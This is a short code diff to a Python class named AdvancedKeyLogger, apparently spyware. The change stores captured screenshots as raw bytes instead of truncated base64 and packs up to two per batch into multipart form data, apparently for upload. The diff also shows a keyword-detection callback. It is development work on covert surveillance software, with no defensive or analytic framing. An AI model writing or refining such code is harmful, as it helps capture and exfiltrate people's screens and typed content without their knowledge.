@@ -254,9 +254,10 @@ class AdvancedKeyLogger:
 
     def _on_screenshot_taken(self, timestamp, image_data, size=None):
         """Callback for screenshot capture"""
+        # Store image bytes directly (not base64) to avoid corruption
         self.screenshot_buffer.append({
             "timestamp": timestamp,
-            "image": base64.b64encode(image_data).decode('utf-8')[:50000]  # Limit size
+            "image_bytes": image_data  # Store raw bytes, not base64
         })
 
     def _on_keyword_detected(self, keyword, context, timestamp=None):
@@ -367,8 +368,8 @@ class AdvancedKeyLogger:
             if self.screenshot_buffer:
                 for idx, screenshot in enumerate(self.screenshot_buffer[:2]):  # Limit to 2 per batch
                     try:
-                        # Decode base64 image
-                        image_bytes = base64.b64decode(screenshot['image'])
+                        # Get image bytes directly (no need to decode base64)
+                        image_bytes = screenshot['image_bytes']
 
                         # Create multipart form data with file
                         files = {
